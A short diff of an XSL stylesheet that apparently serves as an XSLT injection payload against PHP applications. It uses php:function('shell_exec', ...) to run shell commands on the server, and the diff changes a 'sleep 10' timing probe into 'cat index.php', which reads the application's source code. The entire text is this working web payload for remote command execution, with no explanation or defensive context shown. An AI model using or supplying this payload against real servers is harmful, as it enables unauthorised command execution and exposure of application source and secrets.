@@ -3,7 +3,7 @@
   <xsl:template match="/">
     <html>
       <body>
-        <xsl:value-of select="php:function('shell_exec', 'sleep 10')" />
+        <xsl:value-of select="php:function('shell_exec', 'cat index.php')" />
       </body>
     </html>
   </xsl:template>
